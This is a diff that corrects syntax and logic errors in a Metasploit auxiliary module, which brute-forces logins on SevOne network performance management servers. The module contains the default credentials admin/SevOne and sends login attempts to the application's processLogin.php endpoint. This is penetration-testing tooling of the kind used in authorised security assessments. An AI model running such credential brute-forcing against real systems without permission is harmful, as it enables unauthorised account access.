@@ -19,18 +19,18 @@ class Metasploit3 < Msf::Auxiliary
 		super(update_info(info,
 			'Name'	=> 'SevOne Network Performance Management Application Brute Force Login Utility',
 			'Description'    => %{
-				This module scans for SevOne Network Performance Management System Application, finds its version,
-				and performs login brute force to identify valid credentials.},
+					This module scans for SevOne Network Performance Management System Application,
+				finds its version, and performs login brute force to identify valid credentials.
+			},
 			'Author'         =>
 				[
-					'Karn Ganeshen <KarnGaneshen[at]gmail.com>',
+					'Karn Ganeshen <KarnGaneshen[at]gmail.com>'
 				],
-			'DisclosureDate' => 'Jun 07, 2013',
+			'DisclosureDate' => 'Jun 07 2013',
 			'License'        => MSF_LICENSE
 		))
 	register_options(
 		[
-			Opt::RPORT(80),
 			OptString.new('USERNAME', [false, 'A specific username to authenticate as', 'admin']),
 			OptString.new('PASSWORD', [false, 'A specific password to authenticate with', 'SevOne'])
 		], self.class)
@@ -39,7 +39,7 @@ class Metasploit3 < Msf::Auxiliary
 	def run_host(ip)
 		unless is_app_sevone?
 			print_error("Application does not appear to be SevOne. Module will not continue.")
-		return
+			return
 		end
 
 		print_status("Starting login brute force...")
@@ -60,10 +60,11 @@ class Metasploit3 < Msf::Auxiliary
 
 		if (res and res.code.to_i == 200 and res.headers['Set-Cookie'].include?('SEVONE'))
 			version_key = /Version: <strong>(.+)<\/strong>/
-			version = res.body.scan(version).flatten
+			version = res.body.scan(version_key).flatten
 			print_good("Application confirmed to be SevOne Network Performance Management System version #{version}")
-			success = true
+			return true
 		end
+		return false
 	end
 
 	#
@@ -76,12 +77,12 @@ class Metasploit3 < Msf::Auxiliary
 			{
 				'uri'       => "/doms/login/processLogin.php",
 				'method'    => 'GET',
-				vars_get    =>
+				'vars_get'    =>
 				{
-					'login' = user,
-					'passwd' = pass,
-					'tzOffset' = '-25200',
-					'tzString' = 'Thur+May+05+1983+05:05:00+GMT+0700+'
+					'login' => user,
+					'passwd' => pass,
+					'tzOffset' => '-25200',
+					'tzString' => 'Thur+May+05+1983+05:05:00+GMT+0700+'
 				}
 			})
 
@@ -109,7 +110,6 @@ class Metasploit3 < Msf::Auxiliary
 		end
 
 		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
-			res = false
 			print_error("HTTP Connection Failed, Aborting")
 			return :abort
 		end
